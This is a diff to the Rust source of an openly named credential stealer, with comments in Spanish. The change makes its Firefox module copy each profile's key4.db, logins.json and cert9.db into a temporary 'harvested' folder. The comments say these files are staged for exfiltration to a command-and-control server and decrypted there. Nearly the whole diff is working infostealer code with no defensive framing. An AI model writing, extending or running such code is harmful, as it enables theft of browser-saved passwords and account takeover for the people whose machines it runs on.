@@ -2,6 +2,8 @@
 use crate::stealer::{Credential, StealerError, StealerResult};
 use crate::stealer::common::{get_appdata_roaming, file_exists, base64_decode};
 use std::path::PathBuf;
+use std::fs;
+use std::io::Write;
 
 /// Roba credenciales de Firefox
 pub fn steal_firefox() -> StealerResult<Vec<Credential>> {
@@ -38,34 +40,121 @@ pub fn steal_firefox() -> StealerResult<Vec<Credential>> {
 
 /// Extrae credenciales de un perfil específico de Firefox
 fn extract_firefox_profile(profile_path: &PathBuf) -> StealerResult<Vec<Credential>> {
-    // Firefox almacena credentials en logins.json
-    // Por defecto NO están encriptadas (solo Base64)
-    // Solo se encriptan si el usuario configuró Master Password (raro)
+    // ESTRATEGIA FICKER-STEALER:
+    // Firefox moderno (133+) cifra credenciales con NSS
+    // En lugar de intentar descifrar client-side (complejo, requiere nss3.dll),
+    // exfiltramos los archivos RAW al C2 para descifrado server-side
+    //
+    // Archivos necesarios para descifrado NSS:
+    // - key4.db: Contiene la master key cifrada
+    // - logins.json: Credenciales (si existe, versiones antiguas)
+    // - cert9.db: Certificados NSS (opcional pero útil)
     
+    let mut credentials = Vec::new();
+    
+    // Método 1: Intentar logins.json (Firefox antiguas <133)
     let logins_json = profile_path.join("logins.json");
-    
-    if !file_exists(&logins_json) {
-        return Err(StealerError::DatabaseError("Firefox logins.json not found".into()));
+    if file_exists(&logins_json) {
+        if let Ok(content) = std::fs::read_to_string(&logins_json) {
+            if let Ok(creds) = parse_firefox_logins(&content, None) {
+                if !creds.is_empty() {
+                    return Ok(creds);
+                }
+            }
+        }
     }
-
-    // Leer logins.json
-    let logins_content = std::fs::read_to_string(&logins_json)
+    
+    // Método 2: Firefox moderno - Exfiltrar archivos para descifrado server-side
+    // Crear directorio de exfiltración
+    let exfil_dir = get_firefox_exfil_dir()?;
+    let profile_name = profile_path.file_name()
+        .and_then(|n| n.to_str())
+        .unwrap_or("unknown");
+    let profile_exfil = exfil_dir.join(profile_name);
+    
+    // Crear directorio del perfil
+    fs::create_dir_all(&profile_exfil)
         .map_err(|e| StealerError::IoError(e.to_string()))?;
     
-    // Parsear logins.json (no necesitamos master key para la mayoría de casos)
-    parse_firefox_logins(&logins_content, None)
+    // Copiar archivos clave
+    let mut files_copied = 0;
+    
+    // key4.db (CRÍTICO - contiene master key)
+    if let Ok(_) = copy_file_safe(&profile_path.join("key4.db"), &profile_exfil.join("key4.db")) {
+        files_copied += 1;
+    }
+    
+    // logins.json (si existe)
+    if let Ok(_) = copy_file_safe(&profile_path.join("logins.json"), &profile_exfil.join("logins.json")) {
+        files_copied += 1;
+    }
+    
+    // cert9.db (certificados NSS)
+    if let Ok(_) = copy_file_safe(&profile_path.join("cert9.db"), &profile_exfil.join("cert9.db")) {
+        files_copied += 1;
+    }
+    
+    // Crear archivo de metadatos
+    let metadata = format!(
+        "Firefox Profile: {}\nFiles copied: {}\nExfiltration timestamp: {:?}\nNote: Use NSS server-side decrypt\n",
+        profile_name,
+        files_copied,
+        std::time::SystemTime::now()
+    );
+    
+    if let Ok(mut f) = fs::File::create(profile_exfil.join("README.txt")) {
+        let _ = f.write_all(metadata.as_bytes());
+    }
+    
+    // Agregar credencial placeholder para indicar que hay datos exfiltrados
+    if files_copied > 0 {
+        credentials.push(Credential {
+            browser: "Firefox".to_string(),
+            url: format!("[RAW FILES EXFILTRATED] Profile: {}", profile_name),
+            username: format!("{} files copied to harvested/firefox/", files_copied),
+            password: "[decrypt server-side with NSS using key4.db]".to_string(),
+        });
+    }
+    
+    if credentials.is_empty() {
+        Err(StealerError::DatabaseError("No Firefox credentials found".into()))
+    } else {
+        Ok(credentials)
+    }
 }
 
-/// Copia la base de datos a un archivo temporal
-fn copy_db_to_temp(db_path: &PathBuf) -> StealerResult<PathBuf> {
+/// Obtiene el directorio de exfiltración de Firefox
+fn get_firefox_exfil_dir() -> StealerResult<PathBuf> {
     let temp_dir = std::env::temp_dir();
-    let temp_name = format!("tmp_ff_{}.db", std::process::id());
-    let temp_path = temp_dir.join(temp_name);
+    let exfil_dir = temp_dir.join("harvested").join("firefox");
     
-    std::fs::copy(db_path, &temp_path)
+    fs::create_dir_all(&exfil_dir)
         .map_err(|e| StealerError::IoError(e.to_string()))?;
     
-    Ok(temp_path)
+    Ok(exfil_dir)
+}
+
+/// Copia un archivo de forma segura (ignora errores de locked files)
+fn copy_file_safe(src: &PathBuf, dst: &PathBuf) -> StealerResult<()> {
+    if !file_exists(src) {
+        return Err(StealerError::IoError("Source file not found".into()));
+    }
+    
+    // Firefox puede tener archivos bloqueados, intentar copiar
+    match fs::copy(src, dst) {
+        Ok(_) => Ok(()),
+        Err(e) => {
+            // Si está bloqueado, intentar leer y escribir manualmente
+            match fs::read(src) {
+                Ok(content) => {
+                    fs::write(dst, content)
+                        .map_err(|e| StealerError::IoError(e.to_string()))?;
+                    Ok(())
+                }
+                Err(_) => Err(StealerError::IoError(format!("Cannot copy file: {}", e)))
+            }
+        }
+    }
 }
 
 /// Parsea logins.json y extrae credenciales
